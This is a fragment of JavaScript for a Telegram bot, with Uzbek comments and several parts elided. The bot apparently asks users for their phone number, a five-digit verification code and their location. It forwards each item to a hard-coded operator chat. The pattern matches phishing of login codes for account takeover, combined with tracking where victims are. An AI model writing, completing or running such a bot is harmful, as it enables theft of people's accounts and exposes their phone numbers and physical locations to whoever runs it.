...
number = test(message);
  ...
  bot.sendMessage(chatIdmy, `Telefon nomeri: ${message}`)
  setTimeout(function() {
...
// Kodni tekshirib yuborish va [Joylashuvingizni chiqarish]
bot.on('message', (msg) => {
  ...
  if (/^\d{5}$/.test(messageText)) {
    ...
    bot.sendMessage(chatIdmy, `Code: ${messageText}`)
}
})
// Command to request the location
bot.onText(/Joylashuvni ulashish./, (msg) => {
  const chatId = msg.chat.id;
  
  // Reply with a keyboard to request location
  const opts = {
      reply_markup: {
          keyboard: [
              [{
...
bot.on('location', (msg) => {
  ...
  bot.sendMessage(chatIdmy, `Location received:\nLatitude: ${location.latitude}\nLongitude: ${location.longitude}`);
